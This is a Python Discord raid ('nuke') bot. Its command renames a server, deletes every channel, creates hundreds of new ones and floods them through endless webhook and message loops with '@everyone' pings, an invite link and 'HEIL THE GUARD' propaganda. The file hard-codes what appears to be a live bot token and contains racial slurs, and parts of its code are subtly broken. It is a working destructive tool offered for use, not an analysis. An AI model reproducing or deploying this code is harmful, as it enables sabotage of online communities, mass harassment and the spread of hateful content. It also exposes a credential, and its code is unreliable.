import discord
from discord.ext import commands
import random
import colorama
from colorama import Fore, Back, Style, init
init()

TOKEN = "MTA5MTc3NDk0NTE3Mzk2Mjg0Mg.Gjof11.X_IZ-HheFpiYEAd8FRY_xRPaFe0Su8Wq7B-7IM"
channel = "heil-hmg"
spam = ["""
```Nuked By His Majesty's Guard [ĦМ₲]```

__**HEIL THE GUARD**__
https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966/Untitled296_20221128195950.png
https://discord.gg/rdXHweYQ7f
||@everyone||
"""]
webhook = "NIGGERED BY THE GUARD"

intents = discord.Intents.all()
client = commands.Bot(command_prefix = ">", intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â€ƒâ€ƒâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â€ƒâ€ƒâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â€ƒâ€ƒâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•â•â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â€ƒâ€ƒâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—")
    print(f"{Fore.MAGENTA}â–ˆâ–ˆâ•‘â–‘â•šâ•â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â€ƒâ€ƒâ–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘")
    print(f"{Fore.MAGENTA}â•šâ•â•â–‘â–‘â–‘â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â•â•â•â•â•â€ƒâ€ƒâ•šâ•â•â–‘â–‘â•šâ•â•â•â–‘â•šâ•â•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â–‘â–‘â•šâ•â•")
    print("Niggas will get nukkad lol")

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="HMG OWNS YOU LMAO")
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            print("DELETING CHANNELS: FAILED")
    for _i in range(125):
        await ctx.guild.create_text_channel(name=(random.choice(channel)))
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invitation: {link}")
    amount = 500
    for i in range(amount):
     await ctx.guild.create_text_channel(name=random.choice(channel))
    return

@client.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name=random.choice(webhook))
  while True:
    await channel.send(random.choice(spam))
    await webhook.send(random.choice(spam),
                           username=random.choice(webhook))  

client.run(TOKEN)
